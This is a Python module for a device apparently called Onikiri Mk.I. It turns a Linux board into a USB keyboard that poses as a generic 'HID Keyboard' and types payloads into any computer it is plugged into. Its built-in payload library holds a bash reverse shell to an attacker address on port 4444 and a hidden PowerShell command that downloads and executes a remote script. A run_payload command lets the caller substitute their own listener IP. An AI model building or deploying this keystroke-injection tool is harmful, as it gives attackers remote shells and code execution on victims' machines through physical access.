"""
Onikiri Mk.I — HID Gadget Module
USB HID keyboard/mouse emulation via Linux USB gadget framework (ConfigFS).
Delivers payloads as keystroke sequences when device is connected as USB client.

Kernel requirements: CONFIG_USB_GADGET, CONFIG_USB_G_HID
"""

from __future__ import annotations

import asyncio
import time
from pathlib import Path
from typing import Any

from .base_module import BaseModule, ModuleState

# Standard US keyboard HID scancodes (subset)
_SCANCODE: dict[str, int] = {
    "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08,
    "f": 0x09, "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D,
    "k": 0x0E, "l": 0x0F, "m": 0x10, "n": 0x11, "o": 0x12,
    "p": 0x13, "q": 0x14, "r": 0x15, "s": 0x16, "t": 0x17,
    "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B, "y": 0x1C,
    "z": 0x1D, "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21,
    "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26,
    "0": 0x27, "\n": 0x28, " ": 0x2C, ".": 0x37, "/": 0x38,
    "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30, "\\": 0x31,
    ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36,
}
_SHIFT_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:\"<>?~")
_SHIFT_MAP: dict[str, str] = {
    "A": "a", "B": "b", "C": "c", "D": "d", "E": "e", "F": "f",
    "G": "g", "H": "h", "I": "i", "J": "j", "K": "k", "L": "l",
    "M": "m", "N": "n", "O": "o", "P": "p", "Q": "q", "R": "r",
    "S": "s", "T": "t", "U": "u", "V": "v", "W": "w", "X": "x",
    "Y": "y", "Z": "z", "!": "1", "@": "2", "#": "3", "$": "4",
    "%": "5", "^": "6", "&": "7", "*": "8", "(": "9", ")": "0",
    "_": "-", "+": "=", "{": "[", "}": "]", "|": "\\", ":": ";",
    '"': "'", "<": ",", ">": ".", "?": "/", "~": "`",
}

_HID_DEVICE = Path("/dev/hidg0")
_CONFIGFS = Path("/sys/kernel/config/usb_gadget/onikiri")


class HidGadgetModule(BaseModule):
    name = "hid_gadget"
    description = "USB HID gadget: keyboard emulation and payload delivery"
    commands = {
        "setup":         "Initialise USB HID gadget via ConfigFS",
        "teardown":      "Remove USB HID gadget",
        "type_string":   "Type a string as HID keyboard keystrokes",
        "run_payload":   "Execute a named payload from the payload library",
        "press_key":     "Send a single key press with optional modifiers",
        "status":        "Return HID gadget status",
    }

    # ── Built-in payload library ───────────────────────────────────────────────
    _PAYLOADS: dict[str, str] = {
        "reverse_shell_bash": (
            "bash -i >& /dev/tcp/192.168.1.1/4444 0>&1\n"
        ),
        "powershell_download": (
            "powershell -w hidden -c "
            "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/p.ps1')\n"
        ),
        "whoami_hostname": "whoami && hostname\n",
    }

    async def register(self) -> None:
        self.state = ModuleState.IDLE

    async def execute(self, command: str, params: dict) -> Any:
        handlers = {
            "setup":       self._setup,
            "teardown":    self._teardown,
            "type_string": self._type_string,
            "run_payload": self._run_payload,
            "press_key":   self._press_key,
            "status":      self._status,
        }
        handler = handlers.get(command)
        if handler is None:
            raise ValueError(f"unknown command: {command}")
        return await handler(params)

    # ── Commands ──────────────────────────────────────────────────────────────

    async def _setup(self, params: dict) -> dict:
        """Configure USB HID keyboard gadget via ConfigFS."""
        if not Path("/sys/kernel/config").exists():
            return {"error": "configfs not mounted"}

        vendor_id  = "0x1d6b"
        product_id = "0x0104"
        manufacturer = "Generic"
        product = "HID Keyboard"

        cmds = [
            f"mkdir -p {_CONFIGFS}",
            f"echo {vendor_id}  > {_CONFIGFS}/idVendor",
            f"echo {product_id} > {_CONFIGFS}/idProduct",
            f"mkdir -p {_CONFIGFS}/strings/0x409",
            f"echo '{manufacturer}' > {_CONFIGFS}/strings/0x409/manufacturer",
            f"echo '{product}'      > {_CONFIGFS}/strings/0x409/product",
            f"mkdir -p {_CONFIGFS}/configs/c.1/strings/0x409",
            f"echo 'Config 1' > {_CONFIGFS}/configs/c.1/strings/0x409/configuration",
            f"mkdir -p {_CONFIGFS}/functions/hid.0",
            f"echo 1    > {_CONFIGFS}/functions/hid.0/protocol",
            f"echo 1    > {_CONFIGFS}/functions/hid.0/subclass",
            f"echo 8    > {_CONFIGFS}/functions/hid.0/report_length",
            f"ln -sf {_CONFIGFS}/functions/hid.0 {_CONFIGFS}/configs/c.1/",
            "ls /sys/class/udc/ | head -1 | xargs -I{} sh -c "
            f"'echo {{}} > {_CONFIGFS}/UDC'",
        ]
        for cmd in cmds:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
            )
            _, err = await proc.communicate()
            if proc.returncode not in (0, 1):  # ignore "already exists"
                return {"error": err.decode().strip(), "step": cmd[:60]}

        self.state = ModuleState.RUNNING
        return {"device": str(_HID_DEVICE), "configured": True}

    async def _teardown(self, _params: dict) -> dict:
        result = await self._run_subprocess(
            ["sh", "-c",
             f"echo '' > {_CONFIGFS}/UDC 2>/dev/null; "
             f"rm -f {_CONFIGFS}/configs/c.1/hid.0; "
             f"rmdir {_CONFIGFS}/configs/c.1/strings/0x409 2>/dev/null; "
             f"rmdir {_CONFIGFS}/configs/c.1 2>/dev/null; "
             f"rmdir {_CONFIGFS}/functions/hid.0 2>/dev/null; "
             f"rmdir {_CONFIGFS}/strings/0x409 2>/dev/null; "
             f"rmdir {_CONFIGFS} 2>/dev/null || true"]
        )
        self.state = ModuleState.IDLE
        return {"teardown": result["returncode"] == 0}

    async def _type_string(self, params: dict) -> dict:
        self._require(params, "text")
        text = params["text"]
        if len(text) > 2048:
            raise ValueError("text too long (max 2048 chars)")
        delay = float(params.get("delay_ms", 10)) / 1000.0

        self.state = ModuleState.RUNNING
        try:
            chars_sent = await asyncio.to_thread(
                self._write_keystrokes, text, delay
            )
            return {"chars_sent": chars_sent}
        finally:
            self.state = ModuleState.IDLE

    async def _run_payload(self, params: dict) -> dict:
        self._require(params, "payload")
        name = params["payload"]
        text = self._PAYLOADS.get(name)
        if text is None:
            raise ValueError(f"unknown payload: {name!r}")
        # Allow target IP substitution for reverse shell payloads
        if "lhost" in params:
            import ipaddress
            lhost = str(ipaddress.ip_address(params["lhost"]))
            text = text.replace("192.168.1.1", lhost)
        return await self._type_string({"text": text, "delay_ms": params.get("delay_ms", 20)})

    async def _press_key(self, params: dict) -> dict:
        self._require(params, "key")
        key = params["key"]
        modifier = int(params.get("modifier", 0))  # e.g. 0x02 = LSHIFT, 0x01 = LCTRL
        sc = _SCANCODE.get(key.lower())
        if sc is None:
            raise ValueError(f"unsupported key: {key!r}")
        await asyncio.to_thread(self._send_report, modifier, sc)
        await asyncio.to_thread(self._send_report, 0, 0)  # key release
        return {"key": key, "scancode": sc}

    async def _status(self, _params: dict) -> dict:
        return {
            "device_present": _HID_DEVICE.exists(),
            "configfs_present": _CONFIGFS.exists(),
            "state": self.state,
        }

    # ── HID write helpers (blocking — run in thread) ──────────────────────────

    def _write_keystrokes(self, text: str, delay: float) -> int:
        count = 0
        for ch in text:
            needs_shift = ch in _SHIFT_CHARS
            base = _SHIFT_MAP.get(ch, ch)
            sc = _SCANCODE.get(base)
            if sc is None:
                continue
            modifier = 0x02 if needs_shift else 0x00
            self._send_report(modifier, sc)
            time.sleep(delay)
            self._send_report(0, 0)
            time.sleep(delay)
            count += 1
        return count

    @staticmethod
    def _send_report(modifier: int, scancode: int) -> None:
        if not _HID_DEVICE.exists():
            return
        report = bytes([modifier, 0, scancode, 0, 0, 0, 0, 0])
        with open(_HID_DEVICE, "wb") as dev:
            dev.write(report)
